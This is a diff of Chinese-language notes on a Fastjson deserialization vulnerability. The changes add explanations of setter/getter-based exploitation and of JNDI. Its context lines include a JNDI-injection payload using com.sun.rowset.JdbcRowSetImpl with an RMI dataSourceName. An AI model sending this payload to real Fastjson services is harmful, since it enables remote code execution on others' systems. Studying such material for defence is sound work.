@@ -6,9 +6,11 @@ Ref：https://zhuanlan.zhihu.com/p/99075925
 
 反序列化 @type 指定的类时，指定类的 setter 或 getter 被调用导致的命令执行。
 
+漏洞触发和 `setter` 与 `getter` 有关，那么利用就是找那些在 `setter` 和 `getter` 中有敏感方法的类。
+
 ### 利用
 
-JNDI 注入：
+JNDI 注入：Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），轻型目录访问协议（LDAP）或域名服务（DNS）。
 
 `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/POC", "autoCommit":true}`
 
